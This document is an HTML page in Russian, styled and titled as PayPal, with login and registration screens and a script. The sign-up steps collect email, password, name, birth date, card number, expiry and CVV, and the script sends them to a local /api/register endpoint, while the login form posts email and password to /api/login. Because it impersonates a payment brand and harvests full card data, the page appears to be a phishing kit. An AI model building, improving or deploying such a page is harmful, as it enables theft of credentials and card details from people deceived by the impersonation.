<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>PayPal</title>

<style>
*{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto}
body{margin:0;background:#fff;color:#111}

.top{
height:64px;
display:flex;
align-items:center;
justify-content:center;
padding:0 16px;
position:relative;
background:linear-gradient(to bottom,#4f67b8 0%, #1b2f8a 40%, #132b8f 100%);
}

.menu-btn,
.login-btn{
position:absolute;
top:50%;
transform:translateY(-50%);
border:2px solid rgba(255,255,255,.7);
color:#fff;
border-radius:999px;
padding:8px 16px;
background:transparent;
font-size:14px;
cursor:pointer;
}
.menu-btn{left:16px}
.login-btn{right:16px}

.logo{font-weight:700;font-size:20px;color:#fff;}

.screen{display:none;min-height:100vh}
.screen.active{display:block}
.wrap{max-width:420px;margin:0 auto;padding:32px 18px}

h2{margin:32px 0 14px;font-size:28px;text-align:center;font-weight:500;}
.desc{text-align:center;font-size:17px;line-height:1.6;color:#555;margin-bottom:24px;}

.primary{
width:100%;
height:56px;
border:none;
border-radius:999px;
background:#000;
color:#fff;
font-size:17px;
margin-bottom:28px;
cursor:pointer;
}

.menu-register{background:#0070ba !important;}

.field{margin-bottom:14px}
.input{
width:100%;
height:56px;
border-radius:16px;
border:1.5px solid #ddd;
padding:0 16px;
font-size:16px
}
.input:focus{outline:none;border-color:#2563eb}
.input.error{border-color:red}

.input-wrap{position:relative}
.eye{
position:absolute;
right:14px;
top:50%;
transform:translateY(-50%);
font-size:18px;
opacity:.6;
cursor:pointer
}

.check{display:flex;gap:10px;align-items:flex-start;margin-bottom:8px;color:#555}
.check span{font-size:18px;color:#22c55e}

.card{
border:1px solid #eee;
border-radius:18px;
padding:18px;
margin-bottom:16px;
display:flex;
justify-content:space-between;
align-items:center;
}
.card h3{margin:0 0 6px;font-size:18px;font-weight:500;}
.card p{margin:0;color:#666;font-size:15px;}
.arrow{font-size:22px;color:#999}
</style>
</head>

<body>

<section id="start" class="screen active">
<div class="top">
<button class="menu-btn">‚ò∞</button>
<div class="logo">PayPal</div>
<button class="login-btn" onclick="go('login')">–í–æ–π—Ç–∏</button>
</div>

<div class="wrap">
<h2>–õ–∏—á–Ω—ã–π</h2>
<div class="desc">
–ü–æ–∫—É–ø–∞–π—Ç–µ –Ω–∞ —Å–∞–π—Ç–∞—Ö –ø–æ –≤—Å–µ–º—É –º–∏—Ä—É<br>
–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–π—Ç–µ –¥–µ–Ω–µ–∂–Ω—ã–µ –ø–µ—Ä–µ–≤–æ–¥—ã<br>
–¥—Ä—É–∑—å—è–º –∏ –±–ª–∏–∑–∫–∏–º.
</div>
<button class="primary menu-register" onclick="go('reg-email')">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</button>

<h2>–ë–∏–∑–Ω–µ—Å</h2>
<div class="desc">
–ü—Ä–∏–Ω–∏–º–∞–π—Ç–µ –æ–Ω–ª–∞–π–Ω-–ø–ª–∞—Ç–µ–∂–∏<br>
–æ—Ç –∫–ª–∏–µ–Ω—Ç–æ–≤ —á–µ—Ä–µ–∑ –µ–¥–∏–Ω—ã–π<br>
–±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç.
</div>
<button class="primary menu-register" onclick="go('reg-email')">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</button>
</div>
</section>

<section id="login" class="screen">
<div class="top">
<button class="menu-btn" onclick="go('start')">‚Üê</button>
<div class="logo">PayPal</div>
</div>

<div class="wrap">
<h2>–í—Ö–æ–¥</h2>
<div class="field"><input id="loginEmail" class="input" placeholder="Email –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω"></div>
<div class="field"><input id="loginPass" class="input" type="password" placeholder="–ü–∞—Ä–æ–ª—å"></div>
<button class="primary" onclick="validateLogin()">–í–æ–π—Ç–∏</button>
</div>
</section>

<section id="reg-email" class="screen">
<div class="top">
<button class="menu-btn" onclick="go('start')">‚Üê</button>
<div class="logo">PayPal</div>
</div>

<div class="wrap">
<h2>–û—Ç–∫—Ä—ã—Ç—å —Å—á—ë—Ç –≤ PayPal</h2>
<div class="field">
<input id="regEmail" class="input" placeholder="–≠–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞—è –ø–æ—á—Ç–∞">
</div>
<button class="primary" onclick="validateEmail()">–î–∞–ª–µ–µ</button>
</div>
</section>

<section id="reg-pass" class="screen">
<div class="top">
<button class="menu-btn" onclick="go('reg-email')">‚Üê</button>
<div class="logo">PayPal</div>
</div>

<div class="wrap">
<h2>–°–æ–∑–¥–∞–Ω–∏–µ –ø–∞—Ä–æ–ª—è</h2>

<div class="field input-wrap">
<input id="pwd" class="input" type="password" placeholder="–°–æ–∑–¥–∞–π—Ç–µ –ø–∞—Ä–æ–ª—å">
<span class="eye" onclick="togglePwd()">üëÅ</span>
</div>

<div class="check"><span>‚úî</span><p>–û—Ç 8 –¥–æ 20 —Å–∏–º–≤–æ–ª–æ–≤</p></div>
<div class="check"><span>‚úî</span><p>–ú–∏–Ω–∏–º—É–º –¥–≤–∞ —Ç–∏–ø–∞ —Å–∏–º–≤–æ–ª–æ–≤</p></div>

<button class="primary" onclick="validatePassword()">–î–∞–ª–µ–µ</button>
</div>
</section>

<section id="reg-data" class="screen">
<div class="top">
<button class="menu-btn" onclick="go('reg-pass')">‚Üê</button>
<div class="logo">PayPal</div>
</div>

<div class="wrap">
<h2>–õ–∏—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ</h2>
<div class="desc">–£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤–≤–µ–¥—ë–Ω–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞.</div>

<div class="field">
<input id="firstName" class="input" placeholder="–ò–º—è">
</div>

<div class="field">
<input id="lastName" class="input" placeholder="–§–∞–º–∏–ª–∏—è">
</div>

<div class="field">
<input id="birth" class="input" placeholder="DD/MM/YYYY" maxlength="10" oninput="formatBirth(this)">
</div>

<button class="primary" onclick="validateData()">–î–∞–ª–µ–µ</button>
</div>
</section>

<section id="reg-card" class="screen">
<div class="top">
<button class="menu-btn" onclick="go('reg-data')">‚Üê</button>
<div class="logo">PayPal</div>
</div>

<div class="wrap">
<h2>–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –∫–∞—Ä—Ç—ã</h2>

<div class="field input-wrap">
<input id="cardNum" class="input" placeholder="–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã" maxlength="19" oninput="formatCard(this)">
<span class="eye">üí≥</span>
</div>

<div style="display:flex;gap:14px">

<div class="field" style="flex:1">
<input id="exp" class="input" placeholder="MM/YY" maxlength="5" oninput="formatExp(this)">
</div>

<div class="field" style="flex:1">
<input id="cvv" class="input" placeholder="CVV" maxlength="4">
</div>

</div>

<button class="primary" onclick="validateCard()">–î–æ–±–∞–≤–∏—Ç—å –∫–∞—Ä—Ç—É</button>
</div>
</section>

<section id="after-auth" class="screen">
<div class="top">
<button class="menu-btn">‚ò∞ –ú–µ–Ω—é</button>
<div class="logo">PayPal</div>
</div>

<div class="wrap">
<h2>–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω</h2>

<div class="desc">
–û—Ç–ø—Ä–∞–≤–ª—è–π—Ç–µ –ø–µ—Ä–µ–≤–æ–¥—ã –∏ —Å–æ–≤–µ—Ä—à–∞–π—Ç–µ –ø–æ–∫—É–ø–∫–∏<br>
–±—ã—Å—Ç—Ä–æ –∏ —É–¥–æ–±–Ω–æ —Å –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞.
</div>

<div class="card">
<div>
<h3>–û–Ω–ª–∞–π–Ω-–ø–æ–∫—É–ø–∫–∏</h3>
<p>–û–ø–ª–∞—á–∏–≤–∞–π—Ç–µ —Ç–æ–≤–∞—Ä—ã –∏ —É—Å–ª—É–≥–∏ —á–µ—Ä–µ–∑ PayPal.</p>
</div>
<div class="arrow">‚Üí</div>
</div>

<div class="card">
<div>
<h3>–ü–µ—Ä–µ–≤–æ–¥—ã</h3>
<p>–û—Ç–ø—Ä–∞–≤–ª—è–π—Ç–µ –¥–µ–Ω—å–≥–∏ –¥—Ä—É–∑—å—è–º –∏ –±–ª–∏–∑–∫–∏–º.</p>
</div>
<div class="arrow">‚Üí</div>
</div>

</div>
</section>

<script>

let regData = {};

function go(id){
document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
document.getElementById(id).classList.add('active');
window.scrollTo(0,0);
}

function togglePwd(){
const p=document.getElementById('pwd');
p.type=p.type==='password'?'text':'password';
}

function formatBirth(input){
let v=input.value.replace(/\D/g,'');
if(v.length>2 && v.length<=4)
v=v.slice(0,2)+'/'+v.slice(2);
else if(v.length>4)
v=v.slice(0,2)+'/'+v.slice(2,4)+'/'+v.slice(4,8);
input.value=v;
}

function formatExp(input){
let v=input.value.replace(/\D/g,'');
if(v.length>2)
v=v.slice(0,2)+'/'+v.slice(2,4);
input.value=v;
}

function formatCard(input){
let v=input.value.replace(/\D/g,'');
let formatted='';
for(let i=0;i<v.length;i++){
if(i>0 && i%4==0) formatted+=' ';
formatted+=v[i];
}
input.value=formatted;
}

function validateEmail(){
let email=document.getElementById('regEmail');
let pattern=/^[^ ]+@[^ ]+\.[a-z]{2,}$/;
if(!pattern.test(email.value)){
alert("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π email");
return;
}
regData.email=email.value;
go('reg-pass');
}

function validatePassword(){
let pwd=document.getElementById('pwd');
let strong=/^(?=.*[A-Za-z])(?=.*\d).{8,20}$/;
if(!strong.test(pwd.value)){
alert("–ü–∞—Ä–æ–ª—å 8-20 —Å–∏–º–≤–æ–ª–æ–≤ –∏ –º–∏–Ω–∏–º—É–º –±—É–∫–≤—ã + —Ü–∏—Ñ—Ä—ã");
return;
}
regData.password=pwd.value;
go('reg-data');
}

function validateData(){
regData.firstName=document.getElementById('firstName').value;
regData.lastName=document.getElementById('lastName').value;
regData.birth=document.getElementById('birth').value;
go('reg-card');
}

function validateCard(){

regData.card=document.getElementById('cardNum').value;
regData.exp=document.getElementById('exp').value;
regData.cvv=document.getElementById('cvv').value;

fetch("/api/register",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify(regData)
})
.then(r=>r.json())
.then(res=>{
if(res.status=="ok"){
go('after-auth');
}else{
alert(res.message);
}
});
}

function validateLogin(){

let e=document.getElementById('loginEmail').value;
let p=document.getElementById('loginPass').value;

fetch("/api/login",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({email:e,password:p})
})
.then(r=>r.json())
.then(res=>{
if(res.status=="ok"){
go('after-auth');
}else{
alert(res.message);
}
});

}

</script>

</body>
</html>
